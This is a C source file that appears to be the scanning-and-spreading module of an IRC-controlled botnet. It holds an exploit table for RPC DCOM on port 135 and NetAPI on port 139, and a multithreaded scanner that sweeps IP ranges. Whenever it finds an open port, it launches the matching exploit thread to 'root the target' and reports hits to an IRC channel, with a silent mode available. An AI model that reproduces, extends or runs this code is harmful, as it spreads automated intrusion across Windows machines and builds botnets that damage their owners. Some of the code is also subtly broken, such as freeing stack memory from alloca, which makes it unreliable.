#include "includes.h"
#include "extern.h"

Exploit_s pExploit[] =
{
	{"rpc135",		"rpcss.c",			135,	Dcom2,				0,	1,	true},	
	{"netapi",		"netapi.c",			139,	netapi,				0,	1,	true},
	{NULL,			NULL,				0,		NULL,				0,	0,	false}
};

CRITICAL_SECTION hCriticalSection;

int FpHost(DWORD dwRemoteIp, int iFpType)
{
	switch(iFpType)
	{
	case FP_PORT5K:
		{
			if(CheckOpenPort(dwRemoteIp, 5000, 3)) 
				return OS_WINXP;
			break;
		}
		
	case FP_TTL:
		{
			return OS_UNKNOWN;
			break;
		}
		
	default:
		{
			return OS_UNKNOWN;
			break; 
		}
	}
	
	return OS_UNKNOWN;
}

unsigned long GetNextIp()
{
	return (g_dwCurrentIp = ntohl(htonl(g_dwCurrentIp) + 1));
}

unsigned long GetRandomIP()
{
	return (rand() + (rand() << 8) + (rand() << 16) + (rand() << 24));
}

char* GetIP(unsigned long ulIp)
{
	struct in_addr pInternetAddress;
	
	memset(&pInternetAddress,	0x90,	sizeof(pInternetAddress));
	pInternetAddress.s_addr		= (IPAddr)ulIp;
	
	return inet_ntoa(pInternetAddress);
}

bool CheckOpenPort(unsigned long lIpAddress, unsigned short usPort, int iDelay)
{
	unsigned long lBlockCMD = 1;
	bool bConnected = false;
	SOCKADDR_IN sinSockAddrIn;
	SOCKET sSocket;
	
	if(!(sSocket = socket(AF_INET, SOCK_STREAM, 0)))
		return false;
	
	sinSockAddrIn.sin_family			= AF_INET;
	sinSockAddrIn.sin_addr.S_un.S_addr	= lIpAddress;
	sinSockAddrIn.sin_port				= htons(usPort);
	
	if(ioctlsocket(sSocket, FIONBIO, &lBlockCMD) == SOCKET_ERROR)
		return false;
	
	connect(sSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(sinSockAddrIn));
	
	TIMEVAL hTimeVal;
	hTimeVal.tv_sec		= iDelay;
	hTimeVal.tv_usec	= 0;
	
	FD_SET hFdSet;
	FD_ZERO(&hFdSet);
	FD_SET(sSocket, &hFdSet);
	
	if(select(0, 0, &hFdSet, 0, &hTimeVal))
		bConnected = true;
	
	FD_CLR(sSocket, &hFdSet);
	
	closesocket(sSocket);
	return bConnected;
}

void WorkerThread(ScannerThreadHandler_s* pScannerThreadHandler)
{
	while(g_bScanning)
	{
		while(pScannerThreadHandler->pScanStatus != SCAN_STATUS_SCAN)
			Sleep(50);
		
		pScannerThreadHandler->pScanStatus = SCAN_STATUS_SCANNING;
		
		if(CheckOpenPort(pScannerThreadHandler->dwCurrentIp, pScannerThreadHandler->usPort,	pScannerThreadHandler->iDelay))
			pScannerThreadHandler->pScanStatus = SCAN_STATUS_OPEN;
		else
			pScannerThreadHandler->pScanStatus = SCAN_STATUS_CLOSED;
		
		Sleep(1);
	}
	
	ExitThread(0);
}

void ScanThread(ScannerHandler_s *pScannerHandler)
{
	
	sprintf(tstr, "-Scanner- Scanning: -%s:%d- (threads: %d)-(delay: %d)-(minutes: %d)-(logic scan: %s)\r\n",  GetIP(pScannerHandler->dwStartIp), pScannerHandler->usPort, pScannerHandler->iThreads, pScannerHandler->iDelay, pScannerHandler->iMinutes,pScannerHandler->bLogicScan ? "enabled" : "disabled");
	if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);
	Sleep(1500);
	
	// Clear-up old critical-section
	DeleteCriticalSection(&hCriticalSection);
	
	
	// Mark as started, and assign the start IP
	g_bScanning	= true;
	g_dwCurrentIp = pScannerHandler->dwStartIp;
	
	// Allocate memory for loading the workerthreads
	ScannerThreadHandler_s* pScannerThreadHandler = (ScannerThreadHandler_s*)alloca(pScannerHandler->iThreads*sizeof(ScannerThreadHandler_s));
	
	// Enter critical section to prevent thread overwriting
	EnterCriticalSection(&hCriticalSection);
	
	// Load up and initialise the requested amount of workerthreads
	for (int i = 0; i < pScannerHandler->iThreads; i++)
	{
		pScannerThreadHandler[i].dwCurrentIp	= pScannerHandler->dwStartIp;
		pScannerThreadHandler[i].pScanStatus	= SCAN_STATUS_IDLE;
		pScannerThreadHandler[i].usPort			= pScannerHandler->usPort;
		pScannerThreadHandler[i].iDelay			= pScannerHandler->iDelay;
		pScannerThreadHandler[i].hThread		= AddThread(&WorkerThread, &pScannerThreadHandler[i], 1, NULL);
		Sleep(i);
	}
	
	// Keep checking all threads for open ports, when found verify server
	while(g_bScanning)
	{
		// Loop through all threads and suply them a new IP and verify there status
		for (i = 0; i < pScannerHandler->iThreads; i++)
		{
			// Make sure the scanner finished the process
			if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_IDLE);
			else 
				if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_CLOSED);
				else 
					if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_SCAN) 
						continue;
					else
						if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_SCANNING) 
							continue;
						else 
							if(pScannerThreadHandler[i].pScanStatus == SCAN_STATUS_OPEN)
							{
								if(pScannerHandler->iExploitId)
								{
									ExploitInfo_s pExploitInfo;
									
									// If logic scan ain't assigned, only exploit the chosen exploit
									if(!pScannerHandler->bLogicScan && pExploit[pScannerHandler->iExploitId].bEnabled)
									{
										// Fill in exploit struct and root the target
										pExploitInfo.dwExploitId	= pScannerHandler->iExploitId;
										pExploitInfo.dwRemoteIp		= pScannerThreadHandler[i].dwCurrentIp;
										pExploitInfo.usRemotePort	= pScannerHandler->usPort;
										
										AddThread(pExploit[pScannerHandler->iExploitId].hExploit, &pExploitInfo, 1, NULL);
									}
									else
										if(pScannerHandler->bLogicScan)
										{
											for (int iExploit = 0; pExploit[iExploit].usPort != 0; iExploit++)
											{
												if (pExploit[iExploit].bEnabled && pExploit[iExploit].usPort == pScannerHandler->usPort)
												{
													// Fill in exploit struct and root the target
													pExploitInfo.dwExploitId	= iExploit;
													pExploitInfo.dwRemoteIp		= pScannerThreadHandler[i].dwCurrentIp;
													pExploitInfo.usRemotePort	= pScannerHandler->usPort;
													
													AddThread(pExploit[iExploit].hExploit, &pExploitInfo, 1, NULL);
												}
											}
										}
										//else
										sprintf(tstr, "-scanner- open port found: -%s:%d- (thread: %d)\r\n",  GetIP(pScannerThreadHandler[i].dwCurrentIp), pScannerHandler->usPort, i);
										if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);
								}
							}
							pScannerThreadHandler[i].dwCurrentIp = GetNextIp();
							pScannerThreadHandler[i].pScanStatus = SCAN_STATUS_SCAN;
							
							Sleep(20);
		}
		Sleep(20);
	}
	
	// Give the scanner its time to stop all threads
	Sleep(5000);
	
	// Scanning ended, delete all threads and free there arrays
	for (i = 0; i < pScannerHandler->iThreads; i++)
		TerminateThread(pScannerThreadHandler[i].hThread, 0);
	
	free(pScannerThreadHandler);
	
	LeaveCriticalSection(&hCriticalSection);
	DelThread(FindPid("Scanner"));
	ExitThread(0);
}